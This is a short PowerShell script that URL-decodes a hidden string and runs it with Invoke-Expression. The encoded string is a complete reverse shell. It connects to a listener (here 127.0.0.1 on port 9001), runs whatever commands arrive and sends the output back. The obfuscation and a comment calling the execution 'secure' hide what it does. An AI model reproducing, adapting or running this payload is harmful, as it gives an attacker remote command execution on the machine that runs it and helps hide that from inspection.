# Encoded URL
$encodedURL = "%24LHOST%20%3D%20%22127.0.0.1%22%3B%20%24LPORT%20%3D%209001%3B%20%24TCPClient%20%3D%20New-Object%20Net.Sockets.TCPClient%28%24LHOST%2C%20%24LPORT%29%3B%20%24NetworkStream%20%3D%20%24TCPClient.GetStream%28%29%3B%20%24StreamReader%20%3D%20New-Object%20IO.StreamReader%28%24NetworkStream%29%3B%20%24StreamWriter%20%3D%20New-Object%20IO.StreamWriter%28%24NetworkStream%29%3B%20%24StreamWriter.AutoFlush%20%3D%20%24true%3B%20%24Buffer%20%3D%20New-Object%20System.Byte%5B%5D%201024%3B%20while%20%28%24TCPClient.Connected%29%20%7B%20while%20%28%24NetworkStream.DataAvailable%29%20%7B%20%24RawData%20%3D%20%24NetworkStream.Read%28%24Buffer%2C%200%2C%20%24Buffer.Length%29%3B%20%24Code%20%3D%20%28%5Btext.encoding%5D%3A%3AUTF8%29.GetString%28%24Buffer%2C%200%2C%20%24RawData%20-1%29%20%7D%3B%20if%20%28%24TCPClient.Connected%20-and%20%24Code.Length%20-gt%201%29%20%7B%20%24Output%20%3D%20try%20%7B%20Invoke-Expression%20%28%24Code%29%202%3E%261%20%7D%20catch%20%7B%20%24_%20%7D%3B%20%24StreamWriter.Write%28%22%24Output%60n%22%29%3B%20%24Code%20%3D%20%24null%20%7D%20%7D%3B%20%24TCPClient.Close%28%29%3B%20%24NetworkStream.Close%28%29%3B%20%24StreamReader.Close%28%29%3B%20%24StreamWriter.Close%28%29"

# Decode the URL
$decodedURL = [System.Web.HttpUtility]::UrlDecode($encodedURL)

# Execute the decoded script securely
try {
    Invoke-Expression $decodedURL
} catch {
    Write-Host "Error occurred: $_"
}
